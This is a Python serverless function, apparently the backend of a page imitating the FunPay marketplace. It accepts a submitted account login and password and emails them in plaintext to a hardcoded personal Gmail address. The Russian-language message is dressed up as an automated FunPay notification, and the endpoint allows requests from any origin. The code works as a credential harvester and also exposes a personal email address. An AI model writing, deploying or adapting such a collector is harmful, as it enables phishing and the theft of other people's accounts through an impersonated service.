import json
import smtplib
import os
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from typing import Dict, Any
from datetime import datetime

def handler(event: Dict[str, Any], context: Any) -> Dict[str, Any]:
    '''
    Business: Send account credentials to email when buyer submits data
    Args: event - dict with httpMethod, body (login, password, orderId)
          context - object with request_id
    Returns: HTTP response dict
    '''
    method: str = event.get('httpMethod', 'POST')
    
    if method == 'OPTIONS':
        return {
            'statusCode': 200,
            'headers': {
                'Access-Control-Allow-Origin': '*',
                'Access-Control-Allow-Methods': 'POST, OPTIONS',
                'Access-Control-Allow-Headers': 'Content-Type',
                'Access-Control-Max-Age': '86400'
            },
            'body': '',
            'isBase64Encoded': False
        }
    
    if method != 'POST':
        return {
            'statusCode': 405,
            'headers': {'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*'},
            'body': json.dumps({'error': 'Method not allowed'}),
            'isBase64Encoded': False
        }
    
    body_data = json.loads(event.get('body', '{}'))
    login = body_data.get('login', '')
    password = body_data.get('password', '')
    order_id = body_data.get('orderId', 'Unknown')
    
    if not login or not password:
        return {
            'statusCode': 400,
            'headers': {'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*'},
            'body': json.dumps({'error': 'Login and password required'}),
            'isBase64Encoded': False
        }
    
    smtp_host = os.environ.get('SMTP_HOST', 'smtp.gmail.com')
    smtp_port = int(os.environ.get('SMTP_PORT', '587'))
    smtp_user = os.environ.get('SMTP_USER', '')
    smtp_password = os.environ.get('SMTP_PASSWORD', '')
    recipient_email = 'amagovabdul75@gmail.com'
    
    if not smtp_host or not smtp_user or not smtp_password:
        return {
            'statusCode': 500,
            'headers': {'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*'},
            'body': json.dumps({'error': 'SMTP configuration missing'}),
            'isBase64Encoded': False
        }
    
    msg = MIMEMultipart('alternative')
    msg['Subject'] = f'FunPay - Новые данные аккаунта (Заказ #{order_id})'
    msg['From'] = smtp_user
    msg['To'] = recipient_email
    
    current_time = datetime.now().strftime('%d.%m.%Y %H:%M:%S')
    
    html_content = f'''
    <html>
      <body style="font-family: Arial, sans-serif; line-height: 1.6; color: #333;">
        <div style="max-width: 600px; margin: 0 auto; padding: 20px; background: #f5f5f5;">
          <div style="background: #1a1a2e; color: white; padding: 20px; border-radius: 8px 8px 0 0;">
            <h2 style="margin: 0;">🔔 FunPay - Получены данные аккаунта</h2>
          </div>
          <div style="background: white; padding: 30px; border-radius: 0 0 8px 8px;">
            <p style="font-size: 16px; margin-bottom: 20px;">
              Покупатель отправил данные для входа в аккаунт по заказу <strong>#{order_id}</strong>
            </p>
            
            <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 20px 0;">
              <h3 style="margin-top: 0; color: #e94560;">Данные для входа:</h3>
              <p style="margin: 10px 0;">
                <strong>Логин:</strong> <code style="background: #fff; padding: 5px 10px; border-radius: 4px; font-size: 14px;">{login}</code>
              </p>
              <p style="margin: 10px 0;">
                <strong>Пароль:</strong> <code style="background: #fff; padding: 5px 10px; border-radius: 4px; font-size: 14px;">{password}</code>
              </p>
            </div>
            
            <div style="margin-top: 20px; padding-top: 20px; border-top: 1px solid #eee;">
              <p style="font-size: 12px; color: #666; margin: 5px 0;">
                <strong>Время получения:</strong> {current_time}
              </p>
              <p style="font-size: 12px; color: #666; margin: 5px 0;">
                <strong>ID запроса:</strong> {context.request_id}
              </p>
            </div>
            
            <div style="margin-top: 30px; padding: 15px; background: #fff3cd; border-left: 4px solid #ffc107; border-radius: 4px;">
              <p style="margin: 0; font-size: 14px; color: #856404;">
                ⚠️ Это автоматическое уведомление. Проверьте данные и завершите сделку.
              </p>
            </div>
          </div>
        </div>
      </body>
    </html>
    '''
    
    text_content = f'''
FunPay - Получены данные аккаунта

Покупатель отправил данные для входа в аккаунт по заказу #{order_id}

ДАННЫЕ ДЛЯ ВХОДА:
Логин: {login}
Пароль: {password}

Время получения: {current_time}
ID запроса: {context.request_id}

---
Это автоматическое уведомление от FunPay
    '''
    
    part1 = MIMEText(text_content, 'plain')
    part2 = MIMEText(html_content, 'html')
    msg.attach(part1)
    msg.attach(part2)
    
    try:
        server = smtplib.SMTP(smtp_host, smtp_port, timeout=10)
        server.set_debuglevel(0)
        server.starttls()
        server.login(smtp_user, smtp_password)
        server.send_message(msg)
        server.quit()
    except Exception as e:
        return {
            'statusCode': 500,
            'headers': {'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*'},
            'body': json.dumps({'error': f'Email sending failed: {str(e)}'}),
            'isBase64Encoded': False
        }
    
    return {
        'statusCode': 200,
        'headers': {'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*'},
        'body': json.dumps({
            'success': True,
            'message': 'Email sent successfully',
            'orderId': order_id
        }),
        'isBase64Encoded': False
    }